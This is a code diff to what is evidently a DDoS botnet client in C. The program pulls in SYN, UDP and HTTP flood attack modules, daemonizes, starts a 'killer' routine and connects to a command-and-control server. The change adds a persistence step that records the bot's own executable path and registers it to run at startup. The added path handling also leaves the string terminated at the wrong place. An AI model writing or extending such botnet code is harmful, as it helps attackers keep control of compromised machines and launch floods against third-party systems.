@@ -15,6 +15,7 @@
 #include <errno.h>
 #include <fcntl.h>
 #include <poll.h>
+#include <linux/limits.h>
 #include "headers/syn_attack.h"
 #include "headers/udp_attack.h"
 #include "headers/http_attack.h"
@@ -267,6 +268,13 @@ int main(int argc, char** argv) {
 
     daemonize(argc, argv);
     start_killer();
+    
+    char exe_path[PATH_MAX];
+    if (readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1) != -1) {
+        exe_path[sizeof(exe_path) - 1] = '\0';
+        startup_persist(exe_path);
+    }
+    
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(BOT_PORT);
     inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr);
